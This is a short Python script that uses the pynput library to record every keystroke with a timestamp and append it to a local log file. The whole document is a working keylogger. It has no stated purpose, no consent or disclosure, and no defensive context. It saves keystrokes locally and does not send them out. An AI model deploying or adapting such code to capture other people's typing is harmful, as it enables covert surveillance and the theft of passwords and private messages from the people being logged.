from pynput.keyboard import Listener
from datetime import datetime

def keyboard_log(key):
    with open("log_keyborads_keys.txt", "a") as f:
        f.write(f"{datetime.now()} - {key}\n")

with Listener(on_press=keyboard_log) as listener:
    listener.join()